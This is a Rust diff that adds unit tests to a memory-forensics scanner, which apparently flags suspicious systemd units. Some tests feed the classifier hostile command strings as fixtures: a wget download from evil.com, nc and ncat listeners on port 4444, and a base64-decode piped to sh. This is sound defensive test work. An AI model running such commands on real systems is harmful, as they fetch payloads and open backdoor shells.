@@ -51,22 +51,10 @@ const SUSPICIOUS_EXEC_PATTERNS: &[&str] = &[
 const SAFE_EXEC_PREFIXES: &[&str] = &["/usr/", "/bin/", "/sbin/", "/lib/"];
 
 /// Known safe unit name prefixes.
-const KNOWN_SAFE_UNITS: &[&str] = &[
-    "systemd-",
-    "NetworkManager",
-    "dbus",
-    "cron",
-    "ssh",
-];
+const KNOWN_SAFE_UNITS: &[&str] = &["systemd-", "NetworkManager", "dbus", "cron", "ssh"];
 
 /// Unit file extensions we look for.
-const UNIT_EXTENSIONS: &[&str] = &[
-    ".service",
-    ".timer",
-    ".socket",
-    ".path",
-    ".mount",
-];
+const UNIT_EXTENSIONS: &[&str] = &[".service", ".timer", ".socket", ".path", ".mount"];
 
 /// Classify whether a systemd unit is suspicious.
 ///
@@ -433,5 +421,233 @@ mod tests {
         let reader = make_reader_no_systemd();
         let result = walk_systemd_units(&reader).unwrap();
         assert!(result.is_empty());
+    }
+
+    // ---------------------------------------------------------------------------
+    // Missing tasks_offset graceful degradation
+    // ---------------------------------------------------------------------------
+
+    #[test]
+    fn walk_systemd_units_missing_tasks_field_returns_empty() {
+        let isf = IsfBuilder::new()
+            .add_struct("task_struct", 64)
+            .add_field("task_struct", "pid", 0, "int")
+            // No "tasks" field → graceful degradation
+            .add_symbol("init_task", 0xFFFF_8000_0000_0000)
+            .build_json();
+
+        let resolver = IsfResolver::from_value(&isf).unwrap();
+        let (cr3, mem) = PageTableBuilder::new().build();
+        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
+        let reader = ObjectReader::new(vas, Box::new(resolver));
+
+        let result = walk_systemd_units(&reader).unwrap();
+        assert!(result.is_empty(), "missing tasks field must yield empty result");
+    }
+
+    // ---------------------------------------------------------------------------
+    // find_subsequence unit tests
+    // ---------------------------------------------------------------------------
+
+    #[test]
+    fn find_subsequence_found() {
+        let haystack = b"hello world";
+        let needle = b"world";
+        assert_eq!(find_subsequence(haystack, needle), Some(6));
+    }
+
+    #[test]
+    fn find_subsequence_not_found() {
+        let haystack = b"hello world";
+        let needle = b"xyz";
+        assert_eq!(find_subsequence(haystack, needle), None);
+    }
+
+    #[test]
+    fn find_subsequence_empty_needle_returns_none() {
+        let haystack = b"hello";
+        assert_eq!(find_subsequence(haystack, b""), None);
+    }
+
+    #[test]
+    fn find_subsequence_needle_longer_than_haystack_returns_none() {
+        assert_eq!(find_subsequence(b"hi", b"hello"), None);
+    }
+
+    #[test]
+    fn find_subsequence_at_start() {
+        assert_eq!(find_subsequence(b"abcdef", b"abc"), Some(0));
+    }
+
+    // ---------------------------------------------------------------------------
+    // find_name_start unit tests
+    // ---------------------------------------------------------------------------
+
+    #[test]
+    fn find_name_start_stops_at_nul() {
+        let bytes = b"foo\0bar.service";
+        let pos = 11; // end of "bar.service" extension start
+        let start = find_name_start(bytes, pos);
+        // Should stop at NUL (position 3), name starts at 4
+        assert_eq!(start, 4);
+    }
+
+    #[test]
+    fn find_name_start_stops_at_equals() {
+        let bytes = b"ExecStart=evil.service";
+        let pos = 18; // ".service" starts here roughly
+        let start = find_name_start(bytes, pos);
+        // Should stop at '=' at position 9, so start is 10
+        assert_eq!(start, 10);
+    }
+
+    #[test]
+    fn find_name_start_stops_at_space() {
+        let bytes = b"Name= evil.service";
+        let pos = 13;
+        let start = find_name_start(bytes, pos);
+        assert_eq!(start, 6);
+    }
+
+    #[test]
+    fn find_name_start_at_beginning_returns_zero() {
+        let bytes = b"evil.service";
+        // If the name starts at the beginning of the buffer, stop at 0
+        let start = find_name_start(bytes, 4);
+        assert_eq!(start, 0);
+    }
+
+    // ---------------------------------------------------------------------------
+    // find_exec_start unit tests
+    // ---------------------------------------------------------------------------
+
+    #[test]
+    fn find_exec_start_found_in_window() {
+        let mut data = vec![0u8; 1024];
+        let prefix = b"ExecStart=/tmp/evil.sh\n";
+        let marker_pos = 300usize;
+        data[marker_pos..marker_pos + prefix.len()].copy_from_slice(prefix);
+
+        // The unit extension is at marker_pos + 600 (within window)
+        let pos = marker_pos + 600;
+        let result = find_exec_start(&data, pos);
+        assert_eq!(result, "/tmp/evil.sh");
+    }
+
+    #[test]
+    fn find_exec_start_not_found_returns_empty() {
+        let data = vec![b'x'; 1024];
+        let result = find_exec_start(&data, 512);
+        assert!(result.is_empty(), "no ExecStart= → empty string");
+    }
+
+    #[test]
+    fn find_exec_start_terminated_by_nul() {
+        let mut data = vec![0u8; 512];
+        let cmd = b"ExecStart=/bin/sh\x00junk";
+        data[10..10 + cmd.len()].copy_from_slice(cmd);
+        let result = find_exec_start(&data, 200);
+        assert_eq!(result, "/bin/sh");
+    }
+
+    // ---------------------------------------------------------------------------
+    // classify_systemd_unit — additional branch coverage
+    // ---------------------------------------------------------------------------
+
+    #[test]
+    fn classify_systemd_unit_networkmanager_not_suspicious() {
+        assert!(!classify_systemd_unit("NetworkManager.service", "/usr/sbin/NetworkManager"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_dbus_not_suspicious() {
+        assert!(!classify_systemd_unit("dbus.service", "/usr/bin/dbus-daemon"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_ssh_not_suspicious() {
+        assert!(!classify_systemd_unit("ssh.service", "/usr/sbin/sshd"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_cron_not_suspicious() {
+        assert!(!classify_systemd_unit("cron.service", "/usr/sbin/cron"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_wget_exec_suspicious() {
+        assert!(classify_systemd_unit("updater.service", "wget http://evil.com/payload -O /tmp/p"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_python_exec_suspicious() {
+        assert!(classify_systemd_unit("runner.service", "python /var/tmp/runner.py"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_perl_exec_suspicious() {
+        assert!(classify_systemd_unit("runner.service", "perl -e 'print\"hi\"'"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_nc_exec_suspicious() {
+        assert!(classify_systemd_unit("backdoor.service", "nc 10.0.0.1 4444"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_ncat_exec_suspicious() {
+        assert!(classify_systemd_unit("backdoor.service", "ncat -l 4444"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_base64_exec_suspicious() {
+        assert!(classify_systemd_unit("backdoor.service", "base64 -d /tmp/p | sh"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_ruby_exec_suspicious() {
+        assert!(classify_systemd_unit("runner.service", "ruby /tmp/evil.rb"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_var_tmp_exec_suspicious() {
+        assert!(classify_systemd_unit("runner.service", "/var/tmp/payload"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_no_extension_hex_stem_suspicious() {
+        // Stem without known extension → strip_suffix returns None → use full name
+        // "deadbeef12" (10 chars, all lower hex) without extension → treated as full stem
+        assert!(classify_systemd_unit("deadbeef12", ""));
+    }
+
+    #[test]
+    fn classify_systemd_unit_hex_with_uppercase_not_suspicious() {
+        // Uppercase hex → not considered randomized
+        assert!(!classify_systemd_unit("DEADBEEF.service", "/usr/bin/app"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_sbin_not_suspicious() {
+        assert!(!classify_systemd_unit("myapp.service", "/sbin/myapp"));
+    }
+
+    #[test]
+    fn classify_systemd_unit_lib_not_suspicious() {
+        assert!(!classify_systemd_unit("myapp.service", "/lib/systemd/myapp"));
+    }
+
+    #[test]
+    fn systemd_unit_info_debug_format() {
+        let info = SystemdUnitInfo {
+            unit_name: "evil.service".to_string(),
+            exec_start: "/tmp/evil.sh".to_string(),
+            vma_start: 0xFFFF_8000_1000_0000,
+            unit_type: "service".to_string(),
+            is_suspicious: true,
+        };
+        let debug = format!("{info:?}");
+        assert!(debug.contains("evil.service"));
+        assert!(debug.contains("is_suspicious: true"));
     }
 }
